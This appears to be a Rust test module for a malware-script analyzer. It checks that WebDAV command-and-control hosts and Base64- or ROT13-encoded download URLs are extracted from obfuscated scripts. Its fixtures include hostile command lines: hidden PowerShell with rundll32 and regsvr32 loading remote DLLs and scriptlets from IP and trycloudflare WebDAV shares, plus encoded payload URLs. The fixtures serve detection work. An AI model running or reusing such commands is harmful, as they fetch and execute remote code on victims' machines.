#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod unc_webdav_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn unc_webdav_ip_port_extracted() {
        let script = br#"start powershell.exe -windowstyle hidden net use \\45.9.74.36@8888\davwwwroot\ rundll32 \\45.9.74.36@8888\davwwwroot\2731.dll entry"#;
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::UncWebDavC2 { host, port, .. }
                if host == "45.9.74.36" && port == "8888"
            )
        });
        assert!(has, "no UncWebDavC2: {:?}", report.traits);
    }

    #[test]
    fn unc_webdav_preserves_full_command_context() {
        let padding = "A".repeat(260);
        let script = format!(
            r#"start "" /b rundll32 \\104.156.149.6@8888\davwwwroot\host.dll,XSSCheckStart {padding}"#
        );
        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::UncWebDavC2 { host, port, command, .. }
                    if host == "104.156.149.6"
                        && port == "8888"
                        && command == script.as_str()
            )),
            "full UNC WebDAV command was not preserved: {:?}",
            report.traits
        );
    }

    #[test]
    fn unc_webdav_hostname_ssl() {
        let script = br#"regsvr32 /s \\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#;
        let report = analyze(script, &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::UncWebDavC2 { host, port, .. }
                if host.contains("trycloudflare") && port == "SSL"
            )
        });
        assert!(has, "no UncWebDavC2 hostname: {:?}", report.traits);
    }

    #[test]
    fn unc_webdav_deduped_per_command() {
        // Same UNC server referenced twice in one line — emit only one trait per (host, port)
        let script = br#"net use \\45.9.74.36@8888\davwwwroot\ & rundll32 \\45.9.74.36@8888\davwwwroot\x.dll"#;
        let report = analyze(script, &Config::default());
        let count = report
            .traits
            .iter()
            .filter(|t| {
                matches!(t,
                    Trait::UncWebDavC2 { host, .. } if host == "45.9.74.36"
                )
            })
            .count();
        assert_eq!(count, 1, "expected 1 deduped trait, got {}", count);
    }

    #[test]
    fn bare_webdav_share_regsvr32_target_resolves_http_url() {
        let script = br#"start regsvr32 \\104.156.149.6\webdav\c2.dll"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::UrlArgument { cmd, url }
                    if cmd == "regsvr32 \\\\104.156.149.6\\webdav\\c2.dll"
                        && url == "http://104.156.149.6/webdav/c2.dll"
            )),
            "regsvr32 bare WebDAV share URL was not resolved: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::UncWebDavC2 { host, port, http_url, .. }
                    if host == "104.156.149.6"
                        && port == "80"
                        && http_url == "http://104.156.149.6/webdav/c2.dll"
            )),
            "regsvr32 bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
            report.traits
        );
    }

    #[test]
    fn bare_webdav_share_rundll32_target_resolves_http_url() {
        let script = br#"start rundll32 \\104.156.149.6\webdav\host.dll,XSSCheckStart"#;
        let report = analyze(script, &Config::default());
        let has_rundll = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Rundll32 { url: Some(url), .. }
                if url == "http://104.156.149.6/webdav/host.dll"
            )
        });
        assert!(
            has_rundll,
            "rundll32 bare WebDAV share URL was not resolved: {:?}",
            report.traits
        );
        let null_rundll_count = report
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::Rundll32 { url: None, .. }))
            .count();
        assert_eq!(
            null_rundll_count, 0,
            "bare WebDAV rundll32 should not also emit a null URL row: {:?}",
            report.traits
        );
        let has_unc = report.traits.iter().any(|t| {
            matches!(t,
                Trait::UncWebDavC2 { host, port, http_url, .. }
                if host == "104.156.149.6"
                    && port == "80"
                    && http_url == "http://104.156.149.6/webdav/host.dll"
            )
        });
        assert!(
            has_unc,
            "bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod inline_b64_url_tests {
    use crate::env::{Config, Environment};
    use crate::traits::Trait;
    use crate::{analyze, Config as AnalyzeConfig};
    use base64::Engine;

    #[test]
    fn inline_b64_url_in_deob_text_decoded() {
        // The deob text contains a FromBase64String('<url-as-b64>') literal.
        // The decoder should pick this up and emit a DownloadInDeobText.
        let url = "https://gofile.io/dl/abc123";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let script = format!(
            "sEt X=$z=[Convert]::FromBase64String('{}')\r\necho %X%\r\n",
            b64
        );
        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::DownloadInDeobText { src, .. } if src.contains("gofile.io/dl/abc123")
            )
        });
        assert!(has, "no inline-b64 URL extracted: {:?}", report.traits);
    }

    #[test]
    fn b64_url_prefix_ignores_embedded_match_inside_long_b64_blob() {
        let url = "http://ip-api.com/line?field=1";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let deob = format!("echo AAAA{b64}BBBB >> payload.b64\r\n");
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_b64_url_prefix(&deob, &mut env);
        assert!(
            env.traits.is_empty(),
            "embedded b64 substring produced URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn binary_input_public_ip_url_emits_network_probe() {
        let mut input = vec![0u8; 9000];
        input.extend_from_slice(b"embedded http://ip-api.com/line?fields=proxy string");
        let mut env = Environment::new(&Config::default());

        crate::scan_binary_input_urls(&input, &mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::DownloadInDeobText { src, line_hint }
                    if src == "http://ip-api.com/line?fields=proxy" && line_hint == "binary-input"
            )),
            "PE binary URL was not extracted: {:?}",
            env.traits
        );
        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::NetworkProbe { probe_kind, target }
                    if probe_kind == "ip-discovery" && target == "ip-api.com"
            )),
            "binary public-IP URL was not typed as NetworkProbe: {:?}",
            env.traits
        );
    }

    #[test]
    fn binary_input_public_ip_host_match_does_not_use_url_path() {
        let mut input = vec![0u8; 9000];
        input.extend_from_slice(b"embedded http://example.com/path/ip-api.com/line string");
        let mut env = Environment::new(&Config::default());

        crate::scan_binary_input_urls(&input, &mut env);

        assert!(
            env.traits.iter().any(|t| matches!(
                t,
                Trait::DownloadInDeobText { src, line_hint }
                    if src == "http://example.com/path/ip-api.com/line" && line_hint == "binary-input"
            )),
            "PE binary URL was not extracted: {:?}",
            env.traits
        );
        assert!(
            !env.traits
                .iter()
                .any(|t| matches!(t, Trait::NetworkProbe { .. })),
            "URL path substring was incorrectly typed as NetworkProbe: {:?}",
            env.traits
        );
    }

    #[test]
    fn b64_url_prefix_still_extracts_standalone_token() {
        let url = "https://evil.example/payload.exe";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let deob = format!("set encoded_url={b64}\r\n");
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_b64_url_prefix(&deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, cmd, .. } if src == url && cmd == "b64-url-prefix"
            )
        });
        assert!(has, "standalone b64 URL missed: {:?}", env.traits);
        let generic_count = env
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url))
            .count();
        assert_eq!(
            generic_count, 0,
            "standalone b64 URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn b64_url_prefix_respects_noise_filter() {
        let url = "http://sawebservice.red-gate.com/";
        let b64 = base64::engine::general_purpose::STANDARD.encode(url.as_bytes());
        let deob = format!("set encoded_url={b64}\r\n");
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_b64_url_prefix(&deob, &mut env);
        assert!(
            env.traits.is_empty(),
            "noise URL extracted: {:?}",
            env.traits
        );
    }

    #[test]
    fn rot13_url_prefix_extracts_standalone_token() {
        let deob = "powershell [Fiber.Program]::Main('uggcf://nepuvibfpebfbsg.pbz/arjerz.cat')\r\n";
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_rot13_url_prefix(deob, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, cmd, .. }
                    if src == "https://archivoscrosoft.com/newrem.png"
                        && cmd == "rot13-url-prefix"
            )
        });
        assert!(has, "standalone ROT13 URL missed: {:?}", env.traits);
    }

    #[test]
    fn rot13_url_prefix_respects_noise_filter() {
        let deob = "set encoded=uggc://fnjrofreivpr.erq-tngr.pbz/\r\n";
        let mut env = Environment::new(&Config::default());
        crate::deob_scan::scan_rot13_url_prefix(deob, &mut env);
        assert!(
            env.traits.is_empty(),
            "ROT13 noise URL extracted: {:?}",
            env.traits
        );
    }

    #[test]
    fn analyze_extracts_rot13_url_prefix_from_powershell_stage_args() {
        let script = b"powershell -Command \"[Fiber.Program]::Main('uggcf://nepuvibfpebfbsg.pbz/arjerz.cat')\"\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, cmd, .. }
                        if src == "https://archivoscrosoft.com/newrem.png"
                            && cmd == "rot13-url-prefix"
                )
            }),
            "analyze missed ROT13 URL stage arg: {:?}\n{}",
            report.traits,
            report.deobfuscated
        );
    }
}

